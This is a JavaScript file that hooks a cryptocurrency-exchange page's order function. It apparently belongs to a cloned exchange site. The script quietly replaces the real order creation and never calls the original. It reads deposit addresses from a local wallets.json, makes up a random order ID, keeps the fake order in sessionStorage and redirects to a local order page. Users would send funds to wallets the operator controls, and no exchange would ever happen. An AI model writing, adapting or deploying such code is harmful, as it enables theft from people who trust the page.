/**
 * Intercepts exchange form submit: uses send wallet from data/wallets.json,
 * receive wallet from form, builds order and redirects to order.html
 */
(function() {
	function generateOrderId() {
		var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
		var id = '';
		for (var i = 0; i < 6; i++) {
			id += chars.charAt(Math.floor(Math.random() * chars.length));
		}
		return id;
	}

	function overrideCreateOrder() {
		if (typeof Exchange === 'undefined' || !Exchange.createOrder) return;
		var originalCreateOrder = Exchange.createOrder.bind(Exchange);
		Exchange.createOrder = function(payload, btnCallback) {
			fetch('data/wallets.json')
				.then(function(r) { return r.json(); })
				.then(function(wallets) {
					var fromCcy = (payload.fromCcy || '').toUpperCase();
					var sendWallet = wallets[fromCcy] || wallets['ETH'] || '';
					var orderId = generateOrderId();
					var fromAmount = payload.fromQty != null ? String(payload.fromQty) : (Exchange.from && Exchange.from.amount ? String(Exchange.from.amount) : '0');
					var toAmount = payload.toQty != null ? String(payload.toQty) : (Exchange.to && Exchange.to.amount ? String(Exchange.to.amount) : '0');
					var order = {
						id: orderId,
						fromCcy: fromCcy,
						toCcy: (payload.toCcy || '').toUpperCase(),
						fromAmount: fromAmount,
						toAmount: toAmount,
						type: payload.type || 'float',
						sendWallet: sendWallet,
						receiveWallet: payload.toAddress || '',
						tag: payload.tag || '',
						timeLeft: 1800,
						createdAt: Math.floor(Date.now() / 1000)
					};
					try {
						sessionStorage.setItem('ff_order_' + orderId, JSON.stringify(order));
					} catch (e) {}
					if (btnCallback && typeof btnCallback.success === 'function') btnCallback.success();
					window.location.href = 'order.html?id=' + orderId;
				})
				.catch(function() {
					if (btnCallback && typeof btnCallback.error === 'function') btnCallback.error();
				});
		};
	}

	if (document.readyState === 'loading') {
		document.addEventListener('DOMContentLoaded', function() {
			setTimeout(overrideCreateOrder, 100);
		});
	} else {
		setTimeout(overrideCreateOrder, 100);
	}
})();
